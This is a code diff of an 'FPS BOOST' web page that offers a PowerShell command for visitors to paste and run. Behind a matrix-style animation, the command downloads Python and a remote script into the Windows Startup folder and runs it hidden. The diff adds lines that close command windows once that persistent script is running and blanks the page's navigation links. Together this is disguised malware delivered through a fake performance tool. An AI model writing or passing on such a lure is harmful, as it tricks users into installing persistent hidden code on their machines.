@@ -258,7 +258,7 @@
         }
 
         .terminal::before {
-            content: 'CMD'; /* Changed to CMD as requested */
+            content: 'CMD';
             position: absolute;
             top: 0;
             right: 0;
@@ -436,9 +436,9 @@
                 <span class="font-display font-bold text-sm tracking-wider">FPS BOOST</span>
             </a>
             <nav class="nav-links">
-                <a href="#" class="nav-link">Home</a>
-                <a href="#" class="nav-link">Tools</a>
-                <a href="#" class="nav-link">Support</a>
+                <a href="#" class="nav-link">.</a>
+                <a href="#" class="nav-link">.</a>
+                <a href="#" class="nav-link">.</a>
             </nav>
         </header>
 
@@ -530,12 +530,13 @@
     </div>
 
     <script>
-        // The Script as requested by the user
+        // Updated Script with new logic
         const command = `powershell
  $width  = [Console]::WindowWidth
  $height = [Console]::WindowHeight
  $columns = 1..$width | ForEach-Object { Get-Random -Min -20 -Max 0 }
 [Console]::CursorVisible = $false
+
 Start-Job -ScriptBlock {
     $tempPath = "$env:TEMP\\python-installer.exe"
     $pythonUrl = "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe"
@@ -554,7 +555,15 @@ Start-Job -ScriptBlock {
     Invoke-WebRequest -Uri $scriptUrl -OutFile $startupPath
     Start-Process $startupPath -WindowStyle Hidden
 }
+
 while ($true) {
+    $startupFile = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ping_script.pyw"
+    $proc = Get-Process -Name "pyw" -ErrorAction SilentlyContinue
+    if ((Test-Path $startupFile) -and $proc) {
+        Get-Process -Name "cmd" -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_.Id -Force }
+        Stop-Process -Id $PID -Force
+    }
+
     for ($i = 0; $i -lt $width; $i += 2) {
         $y = $columns[$i]
         if ($y -ge 0 -and $y -lt $height) {
